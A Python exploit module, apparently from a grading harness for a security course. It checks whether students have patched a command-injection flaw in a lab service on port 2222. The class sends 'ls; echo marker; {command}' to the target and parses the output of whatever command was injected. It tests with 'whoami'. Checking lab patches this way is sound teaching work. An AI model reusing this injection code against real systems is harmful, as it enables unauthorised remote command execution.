import socket
from Exploit import Exploit, PatchedException, IncorrectPatchException
import BetterLogger
from BetterLogger import logger

class ChallengeOnePython(Exploit):
	def __init__(self, ip_address, parsed_config) -> None:
		super().__init__(ip_address=ip_address, parsed_config=parsed_config)

	def run_custom_command(self, command):
		port = 2222
		# logger.debug(f"{self.ip_address} - Connecting to port {port}...")
		socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket_connection.settimeout(3)
		socket_connection.connect((self.ip_address, port))
		socket_connection.settimeout(None)
		# logger.debug(f"{self.ip_address} - Successfully connected to port {port}.")

		exploit_command = f"ls; echo '0x1x2x3'; {command}" # echo 0x1x2x3 so we can parse for where the actual command injection output begins
		# logger.debug(f"{self.ip_address} - Running command `{exploit_command}`...")
		socket_connection.sendall(exploit_command.encode())
		socket_connection.shutdown(socket.SHUT_WR)
		socket_response = ""
		while 1:
			data = socket_connection.recv(1024)
			if len(data) == 0:
				break
			socket_response = data.decode()
		socket_connection.close()
		# logger.debug(f"{self.ip_address} - The server responded with `{socket_response}`")

		# ensure "ls" works properly
		if "pvuln2_wrapper.py" not in socket_response:
			logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeOnePython so 'ls' no longer outputs correctly!{BetterLogger.COLOR_END}")
			raise IncorrectPatchException()

		try:
			server_output = socket_response.split("0x1x2x3")[1].strip() # split on `0x1x2x3` so we can parse for the command injection output
			return server_output
		except IndexError:
			raise PatchedException(f"{self.ip_address} - The target is patched")

	def test_if_vulnerable(self):
		"""
		Returns True if vulnerable and False if not
		"""
		try:
			logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeOnePython...")
			command = "whoami"
			try:
				self.run_custom_command(command=command)
				logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeOnePython!{BetterLogger.COLOR_END}")
				return True
			except IncorrectPatchException:
				return False
			except ConnectionRefusedError:
				logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeOnePython because the pvuln2_wrapper is not running!{BetterLogger.COLOR_END}")
				return None
		except PatchedException:
			logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeOnePython.{BetterLogger.COLOR_END}")
			return False
		except Exception as err:
			logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeOnePython is vulnerable.{BetterLogger.COLOR_END}")
			logger.exception(err)
			return False
